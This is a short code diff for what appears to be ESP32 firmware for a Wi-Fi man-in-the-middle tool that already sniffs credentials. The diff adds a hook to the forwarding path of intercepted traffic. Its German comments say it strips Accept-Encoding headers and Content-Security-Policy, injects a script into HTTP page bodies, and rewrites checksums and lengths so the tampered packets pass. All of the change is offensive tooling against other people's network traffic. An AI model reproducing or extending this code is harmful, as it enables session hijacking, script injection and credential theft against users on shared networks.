@@ -1,6 +1,7 @@
 #include "wlan_netcut.h"
 #include "wlan_hal.h"
 #include "wlan_cred_sniff.h"
+#include "wlan_html_inject.h"
 
 #include <esp_log.h>
 #include <esp_netif.h>
@@ -443,6 +444,12 @@ static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
                     memcpy(s_fwd_buf, nc->gw_mac, 6); // dst = echter Gateway
                     memcpy(s_fwd_buf + 6, nc->my_mac, 6);
                 }
+                // HTTP-Modifikation: Accept-Encoding-Strip (outbound),
+                // CSP-Strip + <body>-Inject (inbound). Bei Inject wächst
+                // pkt_len um INJECT_SCRIPT_LEN; das Modul updated IP/TCP-
+                // Checksums und Content-Length in-place. No-op wenn nicht
+                // gearmt oder Paket ist kein TCP-HTTP / multi-segment.
+                wlan_html_inject_process_eth(s_fwd_buf, &pkt_len, NETCUT_FWD_BUF_SIZE);
                 bool ok = wlan_hal_send_eth_raw(s_fwd_buf, pkt_len);
                 s_hook_forwarded++;
                 if(inbound) s_mon_in++;
